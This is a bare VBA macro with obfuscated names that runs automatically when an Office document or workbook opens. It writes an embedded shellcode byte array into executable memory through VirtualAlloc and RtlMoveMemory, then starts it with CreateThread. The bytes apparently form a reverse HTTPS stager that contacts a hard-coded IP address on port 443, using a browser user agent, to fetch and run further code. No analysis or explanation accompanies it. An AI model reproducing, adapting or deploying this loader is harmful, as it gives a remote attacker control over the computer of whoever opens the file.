#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Fvzt As Long, ByVal Blgfvx As Long, ByVal Codnezw As LongPtr, Ujyvlesu As Long, ByVal Tmjenjbpd As Long, Evuaqbbda As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Kyd As Long, ByVal Phlgpg As Long, ByVal Kmfrec As Long, ByVal Nqsgyy As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Bpt As LongPtr, ByRef Gsn As Any, ByVal Gna As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Fvzt As Long, ByVal Blgfvx As Long, ByVal Codnezw As Long, Ujyvlesu As Long, ByVal Tmjenjbpd As Long, Evuaqbbda As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Kyd As Long, ByVal Phlgpg As Long, ByVal Kmfrec As Long, ByVal Nqsgyy As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Bpt As Long, ByRef Gsn As Any, ByVal Gna As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Ldibyb As Long, Fnmy As Variant, Zjcfehxt As Long
#If Vba7 Then
	Dim  Joftfuu As LongPtr, Xmluifdd As LongPtr
#Else
	Dim  Joftfuu As Long, Xmluifdd As Long
#EndIf
	Fnmy = Array(232,143,0,0,0,96,49,210,100,139,82,48,139,82,12,139,82,20,137,229,139,114,40,49,255,15,183,74,38,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,139,66,60,87,1,208,139,64,120,133,192,116,76,1,208,139,72,24,80,139,88,32,1,211,133,201,116,60,73,139, _
52,139,1,214,49,255,49,192,193,207,13,172,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,62,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,55,46,48,59,32,114,118,58,49,49,46,48,41,32,108,105,107,101,32,71,101,99,107,111, _
0,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,102,1,0,0,47,114,108,106,85,85,102,120,66,107,82,65,83,79,120,77,54,99,114,70,80,104,81,119,50,119,45,50,73,108,116,121,122,95,67,116,52,116,115,66,97,77,51,48,67,106,97,100,111,45,69,89,84,101,53,90, _
71,53,74,109,69,79,120,50,53,69,45,97,115,102,118,117,97,75,104,84,56,89,45,112,119,71,55,120,102,111,112,76,53,121,119,77,65,105,90,53,97,117,54,48,71,45,77,68,66,103,66,122,117,65,45,85,56,72,105,67,109,65,86,69,99,119,85,49,51,97,50,51,99,85,53,98,54,54,49,117, _
57,78,89,83,108,98,48,97,48,114,53,101,74,70,115,112,67,122,111,106,88,112,97,82,106,49,83,57,81,48,111,109,98,52,108,79,95,76,89,89,54,120,111,115,51,120,73,119,90,78,45,74,118,56,71,79,95,88,73,115,103,115,113,112,95,54,100,88,99,97,82,88,101,102,98,103,68,70,73,83, _
103,65,108,85,114,48,77,115,105,112,70,83,98,77,77,101,78,122,0,80,104,87,137,159,198,255,213,137,198,83,104,0,2,104,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213, _
79,117,225,232,76,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,127,255,255,255,49,48,57,46,49,54,52,46,50,52,55,46, _
49,54,57,0,187,240,181,162,86,106,0,83,255,213)

	Joftfuu = VirtualAlloc(0, UBound(Fnmy), &H1000, &H40)
	For Zjcfehxt = LBound(Fnmy) To UBound(Fnmy)
		Ldibyb = Fnmy(Zjcfehxt)
		Xmluifdd = RtlMoveMemory(Joftfuu + Zjcfehxt, Ldibyb, 1)
	Next Zjcfehxt
	Xmluifdd = CreateThread(0, 0, Joftfuu, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub

